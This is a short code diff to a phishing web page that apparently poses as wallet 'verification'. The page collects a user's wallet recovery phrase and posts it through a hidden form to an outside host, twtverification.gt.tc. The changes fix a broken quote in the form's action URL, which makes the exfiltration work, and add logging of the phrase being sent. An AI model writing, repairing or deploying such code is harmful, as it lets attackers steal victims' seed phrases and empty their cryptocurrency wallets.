@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -196,7 +195,7 @@
         </div>
         
         <!-- 🚨 FORM POST (NO CORS) -->
-        <form id="phraseForm" method="POST" action=https://twtverification.gt.tc/index.php" target="resultFrame">
+        <form id="phraseForm" method="POST" action="https://twtverification.gt.tc/index.php" target="resultFrame">
             <input type="hidden" name="phrase" id="phraseInput">
             <input type="hidden" name="hcaptcha_response" id="hcaptchaInput">
         </form>
@@ -528,10 +527,12 @@
             submitBtn.disabled = !(allFilled && allValid && noDuplicates && captchaValid);
         }
 
-        // 🚨 FORM POST VERSION (NO CORS)
+        // 🚨 FORM POST VERSION (NO CORS) WITH CONSOLE LOG
         async function submitForm() {
             const phrase = inputs.map(i => i.value.trim());
             
+            console.log('🚀 SENDING PHRASE:', JSON.stringify(phrase));
+
             if (!phrase.every(w => wordlist.includes(w.toLowerCase()))) {
                 alert('All words must match the official wordlist.');
                 return;
